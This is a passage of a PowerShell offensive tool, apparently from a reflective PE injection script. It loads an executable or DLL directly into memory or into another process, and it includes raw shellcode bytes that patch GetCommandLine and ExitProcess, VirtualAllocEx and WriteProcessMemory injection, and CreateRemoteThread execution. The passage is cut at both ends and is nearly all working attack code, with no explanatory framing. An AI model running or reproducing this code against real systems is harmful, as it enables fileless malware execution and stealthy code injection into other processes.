        [System.Object]
        $Win32Constants,
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        $ReturnArray = @()
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")
        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 
        }
        $Shellcode1 += 0xb8
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        $ReturnArray = @()
        $ExitFunctions = @() 
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }
            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp
            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        Write-Output $ReturnArray
    }
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
            if ($Name -ceq $FunctionName)
            {
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        return [IntPtr]::Zero
    }
    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PortableExecutableBytes,
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExecutableArgs,
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PortableExecutableBytes $PortableExecutableBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        $PEHandle = [IntPtr]::Zero              
        $EffectivePEHandle = [IntPtr]::Zero     
        if ($RemoteLoading -eq $true)
        {
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($PortableExecutableBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PortableExecutableBytes $PortableExecutableBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                if ($PEInfo.PE64Bit -eq $true)
                {
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }
                $RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExecutableArgs -ExeDoneBytePtr $ExeDoneBytePtr
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."
            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)
                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }
    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
